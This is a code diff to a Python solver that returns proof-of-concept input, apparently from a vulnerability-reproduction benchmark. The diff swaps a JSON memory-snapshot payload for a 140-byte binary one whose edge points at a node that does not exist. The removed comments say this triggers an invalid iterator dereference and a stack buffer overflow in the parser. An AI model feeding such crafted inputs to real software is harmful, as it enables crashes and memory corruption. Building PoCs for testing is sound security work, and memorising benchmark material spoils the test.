@@ -1,4 +1,4 @@
-import json
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
@@ -11,37 +11,41 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        
-        # The vulnerability is triggered by a reference to a non-existent node
-        # in a memory snapshot. This PoC creates a JSON-based snapshot with
-        # one node (id: 1) and one edge from node 1 to a non-existent node (id: 2).
-        # The parser fails to validate the lookup for node 2, dereferences an
-        # invalid iterator, and causes a stack buffer overflow.
-        #
-        # The length is padded to exactly 140 bytes by adjusting the length of
-        # a string value within the JSON. The base structure without padding
-        # in the 'name' field is 100 bytes long, so 40 characters are added.
-        
-        poc_data = {
-            "nodes": [
-                {
-                    "id": 1,
-                    "name": "A" * 40,
-                    "size": 0,
-                    "type": "B"
-                }
-            ],
-            "edges": [
-                {
-                    "from_id": 1,
-                    "to_id": 2,
-                    "type": "C",
-                    "name": "D"
-                }
-            ]
-        }
-        
-        # Serialize to a compact JSON representation and encode to bytes.
-        poc_bytes = json.dumps(poc_data, separators=(',', ':')).encode('utf-8')
-        
-        return poc_bytes
+        poc = bytearray()
+
+        # Header (8 bytes): Magic number "SNPS" and version 1
+        poc.extend(b"SNPS")
+        poc.extend(struct.pack('<I', 1))
+
+        # Counts (16 bytes): 1 node and 1 edge, as 64-bit unsigned integers
+        poc.extend(struct.pack('<Q', 1))  # node_count
+        poc.extend(struct.pack('<Q', 1))  # edge_count
+
+        # Node Data (64 bytes)
+        # Define a single node with ID 1.
+        node_payload = struct.pack(
+            '<IIQQ',
+            1,    # type
+            0,    # name_index
+            1,    # id
+            128   # size
+        )
+        poc.extend(node_payload)
+        poc.extend(b'\x00' * (64 - len(node_payload)))  # Pad to 64 bytes
+
+        # Edge Data (52 bytes)
+        # Define an edge from the existing node (ID 1) to a non-existent
+        # node (ID 2). This triggers the vulnerability when the parser
+        # attempts to look up and dereference an iterator to node 2.
+        edge_payload = struct.pack(
+            '<IIQQ',
+            0,    # type
+            0,    # name_index
+            1,    # from_node_id
+            2     # to_node_id (non-existent)
+        )
+        poc.extend(edge_payload)
+        poc.extend(b'\x00' * (52 - len(edge_payload)))  # Pad to 52 bytes
+
+        # Total length: 8 + 16 + 64 + 52 = 140 bytes
+        return bytes(poc)
